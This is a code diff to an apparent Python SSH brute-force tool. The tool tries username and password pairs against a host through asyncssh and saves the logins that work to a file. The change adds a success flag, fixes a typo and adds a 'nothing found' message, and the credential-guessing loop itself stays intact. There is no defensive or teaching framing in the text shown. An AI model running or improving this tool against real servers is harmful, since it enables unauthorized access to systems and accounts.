@@ -5,11 +5,14 @@ import asyncio
 import time
 import sys
 
+FOUND = False
+
 async def ssh_connect(HOST, PORT, username, password, FLAG):
-            
+    global FOUND
     try:
         async with asyncssh.connect(HOST, port=PORT, username=username, password=password):
             print(f"(!!!) Username - {username} and Password - {password} found.")
+            FOUND = True
             # Save found credentials
             with open("credentials_found.txt", "a") as file:
                 file.write(f"Username: {username}\nPassword: {password}\nWorked on host {HOST}\n")
@@ -115,7 +118,10 @@ async def __main__():
 
         print('Waiting for remaining answers...')        
         await asyncio.gather(*coroutines_list)
-        print('File "credentials_found.txt" was successfuly written')
+        if FOUND:
+            print('File "credentials_found.txt" was successfully written!')
+        else:
+            print('Can\'t found something interesting :C')
 
 # We check if program doesn't start from elsewhere
 if __name__ == '__main__':
